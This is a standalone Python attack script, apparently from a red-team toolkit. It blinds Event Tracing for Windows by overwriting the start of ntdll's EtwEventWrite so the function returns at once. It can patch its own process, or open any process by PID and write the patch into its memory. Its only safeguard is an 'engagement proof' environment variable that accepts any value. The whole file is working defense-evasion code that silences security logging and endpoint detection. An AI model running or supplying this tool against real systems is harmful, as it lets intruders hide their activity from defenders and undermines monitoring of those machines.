#!/usr/bin/env python3
"""
etw_blind.py - ETW (Event Tracing for Windows) bypass via EtwEventWrite patching
Patches EtwEventWrite to silently drop all ETW events from current/remote process.

Usage:
    python scripts/etw_blind.py --mode check
    python scripts/etw_blind.py --mode patch-self
    python scripts/etw_blind.py --mode patch --pid <PID>

Engagement proof: set ENGAGEMENT_PROOF env var.
"""
import argparse
import ctypes
import os
import sys
from ctypes import wintypes

ENGAGEMENT_PROOF = os.environ.get("ENGAGEMENT_PROOF", "")

# Patch: mov eax, 0 (STATUS_SUCCESS); ret
# Makes EtwEventWrite silently return success without writing any event
ETW_PATCH = bytes([0x33, 0xC0, 0xC3])  # xor eax,eax; ret

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
ntdll    = ctypes.WinDLL("ntdll", use_last_error=True)


def require_proof():
    if not ENGAGEMENT_PROOF:
        print("[!] Set ENGAGEMENT_PROOF env var"); sys.exit(1)
    print(f"[+] Proof: {ENGAGEMENT_PROOF}")


def get_etw_addr():
    hmod = kernel32.GetModuleHandleW("ntdll.dll")
    addr = kernel32.GetProcAddress(hmod, b"EtwEventWrite")
    return addr


def check_status():
    addr = get_etw_addr()
    if not addr:
        print("[-] EtwEventWrite not found"); return
    buf = (ctypes.c_ubyte * 6)()
    read = ctypes.c_size_t(0)
    kernel32.ReadProcessMemory(ctypes.c_void_p(-1), ctypes.c_void_p(addr), buf, 6, ctypes.byref(read))
    current = bytes(buf[:read.value])
    patched = current[:3] == ETW_PATCH
    print(f"[*] EtwEventWrite @ 0x{addr:016X}")
    print(f"[*] Bytes  : {current.hex(' ')}")
    print(f"[*] Status : {'PATCHED (ETW blinded)' if patched else 'ACTIVE'}")


def patch_self():
    require_proof()
    addr = get_etw_addr()
    if not addr: return False
    old = wintypes.DWORD(0)
    kernel32.VirtualProtect(ctypes.c_void_p(addr), 3, 0x40, ctypes.byref(old))
    ctypes.memmove(ctypes.c_void_p(addr), ETW_PATCH, 3)
    kernel32.VirtualProtect(ctypes.c_void_p(addr), 3, old, ctypes.byref(old))
    print(f"[+] EtwEventWrite patched @ 0x{addr:016X}: {ETW_PATCH.hex(' ')}")
    return True


def patch_remote(pid: int):
    require_proof()
    addr = get_etw_addr()
    if not addr: return False
    h = kernel32.OpenProcess(0x1F0FFF, False, pid)
    if not h: print(f"[-] OpenProcess failed: {ctypes.get_last_error()}"); return False
    old = wintypes.DWORD(0)
    kernel32.VirtualProtectEx(h, ctypes.c_void_p(addr), 3, 0x40, ctypes.byref(old))
    w = ctypes.c_size_t(0)
    buf = (ctypes.c_ubyte * 3)(*ETW_PATCH)
    ok = kernel32.WriteProcessMemory(h, ctypes.c_void_p(addr), buf, 3, ctypes.byref(w))
    kernel32.VirtualProtectEx(h, ctypes.c_void_p(addr), 3, old, ctypes.byref(old))
    kernel32.CloseHandle(h)
    print(f"[+] ETW blinded PID={pid}: {'OK' if ok else 'FAILED'}")
    return ok


if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--mode", choices=["check","patch-self","patch"], required=True)
    p.add_argument("--pid", type=int)
    args = p.parse_args()
    if sys.platform != "win32": sys.exit("Windows only")
    {"check": check_status, "patch-self": patch_self, "patch": lambda: patch_remote(args.pid) if args.pid else print("--pid required")}[args.mode]()
